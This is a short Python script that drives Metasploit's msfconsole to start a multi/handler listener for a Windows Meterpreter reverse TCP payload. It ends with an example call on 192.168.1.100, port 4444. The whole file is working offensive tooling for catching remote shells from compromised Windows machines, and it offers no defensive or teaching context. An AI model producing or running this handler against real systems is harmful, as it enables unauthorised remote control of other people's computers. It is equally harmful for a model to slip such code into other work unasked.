import subprocess

def meterpreter_reverse_shell(lhost, lport):
    """
    Set up a Meterpreter reverse shell using Metasploit.

    Args:
    lhost (str): Local host IP.
    lport (str): Local port.

    Returns:
    None
    """
    print("Setting up Meterpreter reverse shell...")
    commands = [
        "use exploit/multi/handler",
        "set PAYLOAD windows/meterpreter/reverse_tcp",
        f"set LHOST {lhost}",
        f"set LPORT {lport}",
        "run"
    ]
    subprocess.run(["msfconsole", "-q", "-x", "; ".join(commands)])

# Example usage
meterpreter_reverse_shell("192.168.1.100", "4444")
